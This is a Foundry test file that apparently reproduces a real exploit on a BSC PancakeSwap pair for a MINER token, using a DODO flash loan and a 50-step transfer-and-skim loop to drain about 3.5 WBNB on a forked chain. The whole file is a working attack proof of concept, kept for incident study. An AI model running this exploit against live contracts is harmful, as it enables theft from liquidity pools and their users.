// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~3.5 WBNB
// Attacker : https://bscscan.com/address/0x031958a8137745350549fd95055398dd536a07c7
// Attack Contract : https://bscscan.com/address/0xc9716ec1b0503316233e3bcc50853f0df6befd43
// Vulnerable Contract : https://bscscan.com/address/0x2ba9d4a8c41c60b71ff7df2c3f54b008644b954e
// Attack Tx : https://bscscan.com/tx/0x15ab671c9bf918fa4b6a9eed9ccb527f32aca40e926ede2aec2c84dfa9c30512

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x2ba9d4a8c41c60b71ff7df2c3f54b008644b954e#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

contract MINER is BaseTestWithBalanceLog {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address dodo = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d;

    IERC20 Miner = IERC20(0x7C0BFb9fF0aF660D76fb2bd8865E9b49ff033045);
    IPancakePair Pair = IPancakePair(0x2BA9d4a8C41C60B71ff7Df2c3F54B008644b954e);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 36_111_183-1);
    }

    function testExploit() public {
        Miner.approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        DVM(dodo).flashLoan(10 * 1e18, 0, address(this), abi.encode(0x3078));

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(Miner);
        uint256[] memory amounts = Router.swapTokensForExactTokens(10*1e12, baseAmount, path, address(this), block.timestamp);
        
        uint index = 1;
        // transfer to pair and skim
        while (index <= 50) {
            uint256 balance = Miner.balanceOf(address(this));
            Miner.transfer(address(Pair), balance);
            Pair.skim(address(Pair));
            index++;
        }

        // end while loop, swap back
        Pair.swap(0, 3500751853374879579, address(this), "");
        WBNB.transfer(dodo, 10 * 1e18);
    }
}
